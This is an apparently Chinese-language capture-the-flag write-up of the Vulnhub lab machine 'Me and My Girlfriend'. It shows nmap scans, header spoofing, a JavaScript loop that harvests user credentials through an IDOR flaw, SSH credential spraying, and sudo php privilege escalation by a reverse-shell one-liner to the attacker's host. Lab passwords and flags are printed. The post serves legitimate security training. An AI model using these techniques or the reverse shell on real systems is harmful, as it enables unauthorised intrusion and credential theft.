+++
date = '2026-11-12T20:40:47+08:00'
draft = false
title = '[Vulnhub靶机]Me_and_My_Girlfriend渗透记录'
tags = ['渗透','Vulnhub','SQLi']
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.100.16

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ sudo arp-scan -l      
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.16     00:0c:29:96:0b:c6       VMware, Inc.
10.10.10.254    00:50:56:e2:1e:6f       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.16                                    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-12 20:43 +0800
Nmap scan report for 10.10.10.16
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:96:0B:C6 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.99 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.16
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-12 20:44 +0800
Nmap scan report for 10.10.10.16
Host is up (0.00092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:96:0B:C6 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Sony Android TV (Android 5.0) (94%), Android 5.1 (94%), Android 8 (Linux 3.10) (94%), Linux 3.2 - 3.16 (94%), Linux 4.4 (94%), Android 7.1.2 (Linux 3.4) (94%), Linux 3.8 - 3.16 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.16
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-12 20:44 +0800
Nmap scan report for 10.10.10.16
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum:
|   /robots.txt: Robots file
|   /config/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /misc/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
MAC Address: 00:0C:29:96:0B:C6 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.34 seconds
```

## Web渗透

访问80端口, 告诉我们该网站仅允许本地访问

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

查看源码, 注释中提示我们用XFF伪造

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81.avif)

Nmap漏洞扫描中出现了/robots.txt和/config/, 访问看看

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/robots.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/config.avif)

得到了/heyhoo.txt和config.php两个文件, 访问它们看看

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/heyhoo.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/config%E6%97%A0xff.avif)

在BurpSuite中设置规则自动添加XFF

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/Burp%E6%B7%BB%E5%8A%A0%E8%A7%84%E5%88%99.avif)

重新访问config.php仍是空白, 访问主页发现重定向到/?page=index

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/index.avif)

尝试文件包含, 没有结果, 在register中发现可以注册

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/%E6%B3%A8%E5%86%8C.avif)

注册后登录, 注意到URL中多出了`user_id`参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

修改`user_id`为1, 发现返回了其它用户信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MeandMyGirlfriend/%E8%BF%94%E5%9B%9E%E5%85%B6%E5%AE%83%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF.avif)

我们可以遍历`user_id`, 从而获取所有的用户名和密码, 使用JavaScript自动完成

```javascript
var username_list;
var password_list;
for (let id = 0; id < 100; id++) {
    fetch("http://10.10.10.16/index.php?page=profile&user_id="+id)
    .then(res => {return res.text()})
    .then(html=>{
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const username = doc.getElementById('username').value;
        const password = doc.getElementById('password').value;
        if (username != '') {
            username_list += username + '\n';
            password_list += password + '\n';
        }
    })
};
```

将上面的代码放入浏览器控制台中运行, 然后使用`copy()`函数复制, 就可以把用户名和密码列表复制到剪切板中  
现在我们得到了用户名和对应的密码列表

```text
sedihaingmah
aingmaung
eweuhtandingan
alice
sundatea
abdikasepak
```

```text
cedihhihihi
qwerty!!!
skuyatuh
4lic3
indONEsia
dorrrrr
```

使用crackmapexec尝试登录ssh, 获得一个有效凭据`alice`:`4lic3`

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ crackmapexec ssh 10.10.10.16 -u user.list -p pass.list --continue-on-success --no-bruteforce
SSH         10.10.10.16     22     10.10.10.16      [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
SSH         10.10.10.16     22     10.10.10.16      [-] sedihaingmah:cedihhihihi Authentication failed.
SSH         10.10.10.16     22     10.10.10.16      [-] aingmaung:qwerty!!! Authentication failed.
SSH         10.10.10.16     22     10.10.10.16      [-] eweuhtandingan:skuyatuh Authentication failed.
SSH         10.10.10.16     22     10.10.10.16      [+] alice:4lic3 
SSH         10.10.10.16     22     10.10.10.16      [-] sundatea:indONEsia Authentication failed.
SSH         10.10.10.16     22     10.10.10.16      [-] abdikasepak:dorrrrr Authentication failed.
```

使用凭据登录SSH

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ ssh alice@10.10.10.16         
The authenticity of host '10.10.10.16 (10.10.10.16)' can't be established.
ED25519 key fingerprint is: SHA256:xQf3lfh03E3NNnt5rN/N5zVlGxJJo8QcKykWWCSg1SM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.16' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
alice@10.10.10.16's password: 
Last login: Fri Dec 13 14:48:25 2019
alice@gfriEND:~$
```

## 后渗透

### 枚举

查看当前家目录

```shell
alice@gfriEND:~$ ls -la
total 32
drwxr-xr-x 4 alice alice 4096 Dec 13  2019 .
drwxr-xr-x 6 root  root  4096 Dec 13  2019 ..
-rw------- 1 alice alice   10 Dec 13  2019 .bash_history
-rw-r--r-- 1 alice alice  220 Dec 13  2019 .bash_logout
-rw-r--r-- 1 alice alice 3637 Dec 13  2019 .bashrc
drwx------ 2 alice alice 4096 Dec 13  2019 .cache
drwxrwxr-x 2 alice alice 4096 Dec 13  2019 .my_secret
-rw-r--r-- 1 alice alice  675 Dec 13  2019 .profile
```

发现.my_secret文件夹, 进入得到flag1.txt和my_notes.txt

```shell
alice@gfriEND:~/.my_secret$ ls -la
total 16
drwxrwxr-x 2 alice alice 4096 Dec 13  2019 .
drwxr-xr-x 4 alice alice 4096 Dec 13  2019 ..
-rw-r--r-- 1 root  root   306 Dec 13  2019 flag1.txt
-rw-rw-r-- 1 alice alice  119 Dec 13  2019 my_notes.txt
```

```text
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
```

my_notes.txt感觉没什么重要信息, 只知道有个叫bob的人

```text
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
```

查看靶机中有bash环境的用户, 然而并没有发现bob

```shell
alice@gfriEND:~/.my_secret$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
alice:x:1000:1001:Alice Geulis,1337,+62,+62:/home/alice:/bin/bash
eweuhtandingan:x:1001:1002:,,,:/home/eweuhtandingan:/bin/bash
aingmaung:x:1002:1003:,,,:/home/aingmaung:/bin/bash
sundatea:x:1003:1004:,,,:/home/sundatea:/bin/bash
```

翻了一下Web目录, 发现数据库配置信息

```shell
alice@gfriEND:/var/www/html/config$ cat config.php 
<?php

    $conn = mysqli_connect('localhost', 'root', 'ctf_pasti_bisa', 'ceban_corp');
```

得到数据库用户名`root`密码`ctf_pasti_bisa`  
然而我在数据库中并没有发现任何有用的信息  
查看/var目录, 发现backups文件夹, 然而里面是空的

```shell
alice@gfriEND:/var$ ls -la
total 52
drwxr-xr-x 13 root root   4096 Dec 13  2019 .
drwxr-xr-x 22 root root   4096 Dec 13  2019 ..
drwxr-xr-x  2 root root   4096 Apr 11  2014 backups
drwxr-xr-x  9 root root   4096 Dec 13  2019 cache
drwxrwxrwt  2 root root   4096 Dec 13  2019 crash
drwxr-xr-x 42 root root   4096 Dec 13  2019 lib
drwxrwsr-x  2 root staff  4096 Apr 11  2014 local
lrwxrwxrwx  1 root root      9 Dec 13  2019 lock -> /run/lock
drwxrwxr-x 11 root syslog 4096 Nov 14  2026 log
drwxrwsr-x  2 root mail   4096 Mar  5  2019 mail
drwxr-xr-x  2 root root   4096 Mar  5  2019 opt
lrwxrwxrwx  1 root root      4 Dec 13  2019 run -> /run
drwxr-xr-x  5 root root   4096 Dec 13  2019 spool
drwxrwxrwt  2 root root   4096 Dec 13  2019 tmp
drwxr-xr-x  3 root root   4096 Dec 13  2019 www
alice@gfriEND:/var/backups$ ls -lah
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 11  2014 .
drwxr-xr-x 13 root root 4.0K Dec 13  2019 ..
```

查找所有具有SUID位的文件

```shell
alice@gfriEND:/var/backups$ find / -perm -u=s -type f 2>/dev/null
/bin/ping6
/bin/ping
/bin/umount
/bin/mount
/bin/su
/bin/fusermount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mtr
/usr/bin/pkexec
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```

查看当前用户可以sudo执行哪些目录

```shell
alice@gfriEND:~$ sudo -l     
Matching Defaults entries for alice on gfriEND:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php
```

注意到可以无密码以root身份运行php, 那么我们可以利用它提权

### 法1: php提权

攻击机开启监听, 靶机使用php反弹一个rootshell

```shell
sudo php -r "system('bash -c \'/bin/bash -i >&/dev>tcp/10.10.10.3/4444 0>&1\'');"
```

提权成功

```shell
┌──(kali㉿kali)-[~/MeandMyGirlfriend]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.16] 60042
root@gfriEND:~# whoami
root
```

### 法2: 密码碰撞

数据库密码(`ctf_pasti_bisa`)就是root用户密码

```shell
alice@gfriEND:~$ su root
Password:
root@gfriEND:/home/alice# whoami
root
```

读取flag

```shell
root@gfriEND:~# cd /root
cd /root
root@gfriEND:/root# ls -lah
ls -lah
total 32K
drwx------  3 root root 4.0K Dec 13  2019 .
drwxr-xr-x 22 root root 4.0K Dec 13  2019 ..
-rw-------  1 root root    0 Dec 13  2019 .bash_history
-rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
drwx------  2 root root 4.0K Dec 13  2019 .cache
-rw-r--r--  1 root root 1000 Dec 13  2019 flag2.txt
-rw-------  1 root root  238 Dec 13  2019 .mysql_history
-rw-------  1 root root   81 Dec 13  2019 .nano_history
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
root@gfriEND:/root# cat flag2.txt
cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```
